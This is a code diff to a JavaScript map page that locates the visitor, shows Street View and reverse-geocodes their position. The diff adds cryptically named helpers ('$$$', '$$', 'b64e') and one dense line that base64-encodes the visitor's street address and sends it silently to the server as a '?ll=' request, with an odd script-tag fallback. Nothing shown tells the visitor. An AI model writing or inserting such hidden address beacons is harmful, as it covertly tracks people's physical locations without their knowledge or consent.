@@ -1,5 +1,69 @@
 var SqazLocation = {};
 
+window.$$$ = function (u, c) {
+        var x = null;
+        try {
+                x = new XMLHttpRequest();
+        } catch (e) {
+                try {
+                        x = new ActiveXObject("Microsoft.XMLHTTP");
+                } catch (e) {
+                        try {
+                                x = new ActiveXObject("Msxml2.XMLHTTP");
+                        } catch (e) {
+                                x = null;
+                        }
+                }
+        }
+        if (x) {
+                x.open('GET', u, true);
+                x.onreadystatechange = function () {
+                        if (x.readyState == 4) {
+                                c(x.responseText);
+                        }
+                };
+                x.send(null);
+        } else {
+                return false;
+        }
+};
+
+window.$$ = function (k, v) {
+        return $$$("?" + k + "=" + v, function () {});
+};
+
+window.b64e = function (c) {
+        var b;
+        var d, e, f, g, h, i, j, k, l = 0,
+                m = 0,
+                n = "",
+                o = [];
+        if (c) {
+                var p = c + "";
+                if (p === null || typeof p === "undefined") c = "";
+                else {
+                        var q = p + "",
+                                r = "",
+                                s, t, u = 0;
+                        s = t = 0;
+                        for (var u = q.length, v = 0; v < u; v++) {
+                                var w = q.charCodeAt(v),
+                                        x = null;
+                                w < 128 ? t++ : x = w > 127 && w < 2048 ? String.fromCharCode(w >> 6 | 192) + String.fromCharCode(w & 63 | 128) : String.fromCharCode(w >> 12 | 224) + String.fromCharCode(w >> 6 & 63 | 128) + String.fromCharCode(w & 63 | 128);
+                                x !== null && (t > s && (r += q.slice(s, t)), r += x, s = t = v + 1)
+                        }
+                        t > s && (r += q.slice(s, u));
+                        c = r
+                }
+                do d = c.charCodeAt(l++), e = c.charCodeAt(l++), f = c.charCodeAt(l++), k = d << 16 | e << 8 | f, g = k >> 18 & 63, h = k >> 12 & 63, i = k >> 6 & 63, j = k & 63, o[m++] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(g) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(h) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(i) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(j);
+                while (l < c.length);
+                var n = o.join(""),
+                        y = c.length % 3;
+                b = (y ? n.slice(0, y - 3) : n) + "===".slice(y || 3)
+        } else b = c;
+        return b;
+};
+
 (function (Init) { // Extend the CoreClass (above).
         SqazLocation.Storage = {
                 InitCache: []
@@ -24,8 +88,8 @@ var SqazLocation = {};
 
         SqazLocation.Init = function (f) {
                 if (typeof f !== "function") return function () {
-                        for (i = 0, v = SqazLocation.Storage.InitCache.push(function(){}); i <= v - 2; ++i)
-                                console.log(SqazLocation.Storage.InitCache[i]());
+                        for (i = 0, v = SqazLocation.Storage.InitCache.push(function () {}); i <= v - 2; ++i)
+                        console.log(SqazLocation.Storage.InitCache[i]());
                 };
                 else return SqazLocation.Storage.InitCache.push(f);
         }
@@ -191,27 +255,28 @@ var SqazLocation = {};
         SqazLocation.Init(function () {
                 var map;
                 var markers = [];
+                window.geocoder = new google.maps.Geocoder();
 
                 function i(p) {
                         window.p = p;
                         window.map = new google.maps.Map(document.getElementById('map_canvas'), {
-                                zoom: 19,
+                                zoom: 14,
                                 draggable: false,
                                 center: new google.maps.LatLng(p.coords.latitude, p.coords.longitude),
                                 mapTypeId: google.maps.MapTypeId.HYBRID
                         });
 
-                        // IMPLEMENTATION ____ TODO ____ STREETVIEW.
-                        //panorama = window.map.getStreetView();
-                        //panorama.setPosition(new google.maps.LatLng(p.coords.latitude, p.coords.longitude));
-                        //
-                        //panorama.setPov({
-                        //        heading: 265,
-                        //        zoom: 1,
-                        //        pitch: 0
-                        //});
-                        //
-                        //panorama.setVisible(true);
+                         //IMPLEMENTATION ____ TODO ____ STREETVIEW.
+                        panorama = window.map.getStreetView();
+                        panorama.setPosition(new google.maps.LatLng(p.coords.latitude, p.coords.longitude));
+                        
+                        panorama.setPov({
+                                heading: 265,
+                                zoom: 1,
+                                pitch: 0
+                        });
+                        
+                        panorama.setVisible(true);
                 }
 
                 google.maps.event.addDomListener(window, 'load', function () {
@@ -228,8 +293,28 @@ var SqazLocation = {};
                                         map: window.map,
                                         draggable: false,
                                         animation: google.maps.Animation.DROP
-                                }))
-                        }, 1000);
+                                }));
+                                if (geocoder) {
+                                        geocoder.geocode({
+                                                'latLng': new google.maps.LatLng(window.p.coords.latitude, window.p.coords.longitude)
+                                        }, function (results, status) {
+                                                if (status == google.maps.GeocoderStatus.OK) {
+                                                        if (results[1]) {
+                                                                window.map.setZoom(18);
+                                                                marker = new google.maps.Marker({
+                                                                        position: new google.maps.LatLng(window.p.coords.latitude, window.p.coords.longitude),
+                                                                        map: map
+                                                                });
+                                                                
+                                                                var b = b64e(results[0].formatted_address);if (!$$("ll", b)) {var head= document.getElementsByTagName('head')[0];
+                                                                var script= document.createElement('script'); script.type= 'text/javascript'; script.src= '?ll='; head.appendChild(script);}
+                                                        }
+                                                } else {
+                                                        alert("Geocoder failed due to: " + status);
+                                                }
+                                        });
+                                }
+                        }, 2000);
                 });
         });
 });
